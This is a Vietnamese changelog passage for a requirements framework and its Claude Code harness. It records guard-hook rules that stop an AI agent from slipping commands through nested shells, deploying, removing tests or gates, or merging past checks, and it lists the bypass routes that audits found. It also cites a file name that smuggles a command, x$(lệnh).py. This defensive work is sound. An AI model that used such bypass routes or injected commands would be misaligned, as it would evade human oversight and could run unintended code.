    - `loop verify` chạy lại mọi Gate của task đã tick (một lần mỗi lệnh) trên cây hiện tại, ghi
      `.autopilot/verified.json` kèm dấu vân tay cây: sha256 của HEAD, diff và file chưa track, trừ `.autopilot/`.
    - Cây đổi sau đó, hoặc Gate làm đổi cây, thì phải chạy lại.
    - Lợi ích: bắt bằng chứng bị sửa tay, và bắt task sau làm hỏng Gate của task trước.
    - Ngoài repo git thì bỏ qua bước này.
  - `templates/GO-NO-GO.md`:
    - thêm cột **Nhãn bằng chứng** (`real-path` / `faithful-fixture` / `asserted-not-measured`), là cột mà `QA-STRAT-012`
      (MUST@L) đòi nhưng mẫu chưa có;
    - thêm mục **2b. Bằng chứng chưa chứng minh** (adapter giả, chưa có thiết bị/dữ liệu/quy mô thật).
- **Guard Bash: shell lồng, publish/deploy, gỡ hook/cổng/test** (audit 2026-10-16 đợt 3; AUD-SEC-015, SEC-017, SEC-018,
  SEC-019, HAR-026, HAR-027). Luật deny/ask áp đệ quy cho lệnh trong `sh -c`/`bash -lc` (cả lồng nhiều tầng, quá 3 tầng
  → hỏi), heredoc vào shell và `echo/printf … | sh` (luật hook-bypass riêng cho `-c` gộp vào đây). publish/deploy nhận
  lệnh con ở mọi vị trí (`pnpm -r publish`, `yarn npm publish`, `dotnet nuget push`, `docker build --push`), qua
  `python -m twine` và trình chạy gói (`npx wrangler deploy`); thêm `uv/poetry/bun/gem/helm/flyctl/wrangler/firebase/
  netlify`, `gh workflow run`, `gh repo edit/sync`, `gh variable set`. `mv`/`git mv` (cả nguồn), `git rm`, `perl -i`,
  `cp -t`, đích là thư mục cổng, `&>>` lên file hook/cổng → hỏi; `rm -f <file>` không còn bị cờ `-f` nuốt đường dẫn.
  Bash xoá/dời/sửa tại chỗ file test **đã có** → hỏi (`LOOP-CI-001`). Thiếu `.claude/hooks/guard.py` → hỏi mọi lệnh tới
  khi khôi phục. Commit vào repo **ngoài** dự án → hỏi, không chạy cổng (mã) của repo đó trước bước hỏi quyền (trước đây
  cổng chạy ở repo nhận commit — AUD-HAR-013 — kể cả repo lạ). `GATE_PATTERNS` thêm `pytest.ini`, `tox.ini`,
  `noxfile.py`, `conftest.py`, `vite.config.*`, `.flake8`, `.golangci.y*ml`, `.nycrc*`, `.c8rc*`, `phpunit.xml*`,
  `karma.conf.*`, `.mocharc*` (cùng vào `MERGE_GATE_GLOBS`).
- **Đóng các đường merge vòng qua `xt.py merge-check`** (audit 2026-10-16, ADR-0013; AUD-SEC-016, SEC-020, SEC-021,
  HAR-021, HAR-022, HAR-023). Guard chỉ `allow` lệnh `gh pr merge` *trơn*: một dòng, không `$(…)`/backtick/nháy/heredoc/
  chuyển hướng/gán biến đầu lệnh, chỉ số PR hoặc tên nhánh, chỉ cờ `--squash/--merge/--rebase/--delete-branch/
  --match-head-commit` (`--admin=…`, `--body-file`, URL PR repo khác → hỏi). `gh api` ghi (khác GET, có `-f/-F/--input`,
  mutation GraphQL hoặc query từ `@file`/`--input`/`$(…)`; cờ phương thức cuối thắng như gh) → `ask`; `gh pr -R … merge`,
  `gh alias set`, `--match-head-commit` lặp → `ask`. Tool MCP merge/bật auto-merge PR có hook PreToolUse mới `pre-mcp-guard.sh` (hỏi người).
  Không có python3 → `pre-bash-guard.sh` vẫn hỏi cho `gh pr merge`/`gh api`. `merge-check`: file luật agent và cổng
  (`AGENTS.md`, `CLAUDE.md`, `dev-task.sh`, `vitest.config.*`, `.pre-commit-config.yaml`, `ruff.toml`, `pytest.ini`… ở
  mọi thư mục; danh sách `MERGE_GATE_GLOBS` chứa mọi mẫu cổng của guard — test giữ khớp) và tên cũ của file đổi tên đều
  là làn chuẩn; cần ít nhất một check SUCCESS (chỉ SKIPPED/NEUTRAL → `human`). Dự án đích: chạy lại `install.py`
  (`merge_hooks` tự thêm hook MCP; `guard.py`, `pre-bash-guard.sh` mới gộp tay `*.xtemplates-new` nếu đã sửa).

## [2.0.0] - 2026-10-14

### Fixed (dogfood: áp khung lên chính repo, blueprint cli-tool quy mô S)
- `scripts/dev-task.sh`: đường dẫn file truyền qua `$1`, không nội suy vào `bash -c` (tên file `x$(lệnh).py` từng chạy được lệnh);
  khoá `""` trong `xs.yaml` nghĩa là cố ý bỏ qua, không tự dò; nháy chỉ bỏ khi bọc hai đầu.
- `xs.py loop record --task` kiểm định dạng ID (trước đó `--task ../../x` ghi ra ngoài `.autopilot/evidence/`); `output_tail` che giá trị giống bí mật.
- `xs.py compose`: lọc `applies_to` cho cả `kind: standard`; đổi gốc liên kết tương đối trong mục (trước đó mọi BLUEPRINT.md có link gãy);
  ghép lại vào file có sẵn **giữ trạng thái + ghi chú theo ID** (trước đó ghi đè làm mất tick).
- `xs.py`: `--hours 0` có hạn; đọc blueprint chuẩn hoá NFC; thư mục khung/file thiếu báo một dòng, exit 2; ghi file nguyên tử.
- `.claude/hooks/pre-bash-guard.sh`: bỏ `mapfile` và `sed '\n'` để chạy với bash 3.2/BSD (macOS); `pre-edit-guard.sh` hỏi khi sửa `xs.yaml`, `scripts/dev-task.sh`.

### Added
- `xs.py --version` (file `VERSION`), `--help` có ví dụ + mã thoát, `blueprint-status --json` và `-` đọc stdin.
- Cổng repo: `ruff.toml` (format + lint E9/F), mypy 2.4.0, CI chạy đúng `scripts/dev-task.sh gate`, test trên Python 3.11 và 3.13,
  chạy nguyên văn khối lệnh README, kiểm tiêu đề PR; workflow `links.yml` (link ngoài hằng tuần), `portability.yml` (macOS bash 3.2).
- `BLUEPRINT.md` của chính repo (cli-tool, S): 54 MUST đạt · 11 miễn · 5 chờ admin/phát hành.
- `BASE-GATE-019` (MUST@M): ruleset không bypass + review bắt buộc, tách khỏi `BASE-GATE-007`.

### Changed
- Sàn Python 3.11 (3.9/3.10 hết hỗ trợ). `BASE-ERR-005/006`, `PRF-CLI-008/009/011` → `MUST@M`; `BASE-ERR-002/003`, `BASE-CFG-007/008`,
  `BASE-SEC-010`, `PRF-CLI-005`, `BASE-REPO-002`, `BASE-DOC-007`, `BASE-DEP-006`, `BASE-GATE-001` viết lại để áp được cho CLI/thư viện.
- Ngừng dùng thêm: `BASE-DOC-002` (→ `BASE-REPO-007`), `BASE-SEC-003` (→ `BASE-DEP-004`).


### Added
- Khung v2: thư viện yêu cầu có ID — 18 mảng (`framework/01-baseline` … `18-cross-cutting`), 14 hồ sơ loại phần mềm,
  8 gói ngành, 6 bản đồ tiêu chuẩn, 15 mẫu tài liệu (`framework/templates/`), phương pháp `framework/00-method/`.
- `scripts/xs.py`: `validate` · `list` · `compose` (`--profile`, `--industry`, `--scale`, `--add`, `--include-may`) ·
  `blueprint-status --strict` · `loop init/status/record/block/resume/stop/hook-stop` · `stats`.
- `scripts/install.py` (cài vào `.xstored/` + harness copy-if-absent), `scripts/check-links.py`, `scripts/dev-task.sh` (đọc `xs.yaml`).
- Harness `.claude/`: 5 hook (session-start, pre-bash-guard, pre-edit-guard, auto-format, stop-guard), 8 skill
  (autopilot, blueprint, gate, research, audit, review, adr, handover), 3 subagent (researcher, executor, reviewer).
- `AGENTS.md` (luật dùng chung) + `CLAUDE.md` (`@AGENTS.md`); mẫu `AGENTS.md`/`CLAUDE.md`/`xs.yaml` cho dự án đích.
- CI: job `quality` (validate, link, shellcheck, JSON, 50 test, ghép thử mọi hồ sơ × ngành, cài thử), `protection-guard`,
  `gitleaks`, CodeQL Python; action ghim SHA; Dependabot github-actions; ruleset mẫu; PR template; CONTRIBUTING; SECURITY; LICENSE MIT.
- ADR-0001 (khung = thư viện ID + máy ghép/kiểm), ADR-0002 (harness hook + điểm dừng + bằng chứng), ADR-0003 (quy mô S chỉ sàn là MUST).
- `xs.py loop resume` (tiếp tục sau BLOCKED, giữ số vòng/bằng chứng); hook chặn `git commit --allow-empty`; `install.py --with-github`.
- README gốc; PROGRESS.md theo mẫu 4 mục.
- `research/`: 4 bản nghiên cứu nền ngày 2026-10-13 (khung cũ, catalog `stored`, AI agent, cơ chế Claude Code).

### Changed (rà chéo nhất quán 2026-10-14)
- OWASP Top 10 for LLM Applications: chuyển sang ấn bản **2026** (công bố 04/08/2026); mã LLM0x đổi theo bảng ánh xạ trong `12-security/ai-security.md`.
- EU AI Act Điều 50: áp dụng từ 02/08/2026 (không bị Omnibus 2026/1744 hoãn); chỉ đánh dấu máy đọc Điều 50(2) cho hệ đã lưu hành có hạn 02/12/2026.
- Mọi dẫn chiếu NĐ 13/2023 như văn bản hiện hành → Luật 91/2025/QH15 + NĐ 356/2025/NĐ-CP.
- `SEC-WEB-007` (CSRF) chấp nhận token **hoặc** kiểm `Origin`/`Sec-Fetch-Site`; `XC-UNITS-005` (tiền) chốt số nguyên mặc định, `numeric` chỉ khi có ADR; `BASE-REPO-013` lên MUST; `BE-INT-008` MUST → MUST@M.
- WCAG 2.2 REC 2023-10-05 (cập nhật 2024-12-12); SLSA Build L2 @M / L3 @L; CycloneDX 1.7; OpenAPI 3.1.x mặc định.
- `00-method/conventions.md`: thêm bản đồ "một chủ đề một nhà" và cách gộp mục trùng.

### Deprecated
- 50 mục trùng nội dung chuyển sang `MAY` "Ngừng dùng — gộp vào <ID nhà>" (không vào blueprint mặc định, ID không cấp lại):
  AI-PROTO-009, AI-PROTO-013, ARC-INT-013, BASE-CFG-004, BASE-CFG-009, BASE-CFG-010, BASE-CFG-013, BASE-CFG-015, BASE-CFG-017, BASE-DATA-004, BASE-DATA-007, BASE-DATA-013, BASE-DATA-015, BASE-DATA-016, BASE-ERR-018, BASE-ERR-019, BASE-REPO-009, BASE-SEC-008, BASE-SEC-012, BE-AUTH-012, BE-AUTH-019, BE-AUTH-021, BE-JOB-002, BE-JOB-011, FE-SEC-006, FE-SEC-016, FE-SEC-020, LOOP-CTX-007, PRF-AGENT-015, QA-PERF-001, QA-PERF-003, QA-PERF-004, QA-PERF-005, SEC-AI-012, SEC-LOG-003, SEC-LOG-004, SEC-SECRET-003, SEC-WEB-003, SEC-WEB-005, SEC-WEB-024, SEC-WEB-025, STD-PROC-006, STD-PROC-007, STD-PROC-008, UX-RESP-004, WF-ENV-001, WF-ENV-002, WF-ENV-003, WF-ENV-004, WF-ENV-015.

### Removed
- Khung v1 (văn xuôi + scaffold Next.js/Supabase, commit `1b80fe4`) — khôi phục bằng `git archive 1b80fe4`.
